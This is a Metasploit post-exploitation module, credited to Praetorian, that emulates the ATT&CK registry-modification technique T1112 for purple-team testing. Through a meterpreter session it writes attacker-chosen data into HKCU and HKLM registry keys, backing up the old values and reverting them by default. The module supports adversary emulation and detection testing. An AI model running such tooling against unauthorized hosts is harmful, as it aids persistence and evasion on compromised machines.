##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Accounts
  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Modify Registry (T1112) Windows - Purple Team',
                      'Description'   => %q{
                        Defense Evasion:
                        Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in Persistence and Execution.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1112' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new('REGKEY', [true, 'Target key to modify.', "HKCU\\System\\CurrentControlSet\\Policies"]),
      OptString.new('REGVAL', [true, 'Target value to change.', 'Debugger']),
      OptString.new('REGDATA', [true, 'Target data to set.', 'Praetorian']),
      OptBool.new('CLEANUP', [ true, 'Revert the change', true])
    ])
  end

  def run
  #
  #
  #
    begin
      raise "Module requires meterpreter session" unless session.type == 'meterpreter'

      # backup value if it exists
      print_status("Backing up #{datastore['REGVAL']} from #{datastore['REGKEY']}")
      backup = registry_getvaldata(datastore['REGKEY'], datastore['REGVAL'])
      print_status("Backing up #{datastore['REGVAL']} from #{datastore['REGKEY'].sub(/HKCU/, 'HKLM')}")
      backup_admin = registry_getvaldata(datastore['REGKEY'].sub(/HKCU/, 'HKLM'), datastore['REGVAL']) unless not is_admin?

      # edit user and admin keys
      print_status("Editing user key...")
      t1112_regedit(datastore['REGKEY'], datastore['REGVAL'], datastore['REGDATA'])
      print_status("Editing machine key...")
      t1112_regedit(datastore['REGKEY'].sub(/HKCU/, 'HKLM'), datastore['REGVAL'], datastore['REGDATA']) unless not is_admin?

      # cleanup
      if datastore['CLEANUP']
        print_status("Cleaning up...")
        if backup.nil? or backup.empty?
          registry_deleteval(datastore['REGKEY'], datastore['REGVAL'])
        else
          registry_setvaldata(datastore['REGKEY'], datastore['REGVAL'], backup, 'REG_SZ')
        end
        if is_admin?
          if backup_admin.nil? or backup_admin.empty?
            registry_deleteval(datastore['REGKEY'].sub(/HKCU/, 'HKLM'), datastore['REGVAL'])
          else
            registry_setvaldata(datastore['REGKEY'].sub(/HKCU/, 'HKLM'), datastore['REGVAL'], backup_admin, 'REG_SZ')
          end
        end
      end

      print_good("Module T1112W execution successful.")

   rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1112W execution failed.")
   end
  end


  def t1112_regedit(key, value, data)
    # write user-specified value
    print_status("Writing '#{data}' to #{key}\\#{value}")
    if registry_setvaldata(key, value, data, 'REG_SZ')
      print_good("Key change successful.")
    else
      raise "Registry edit failed."
    end
  end
end
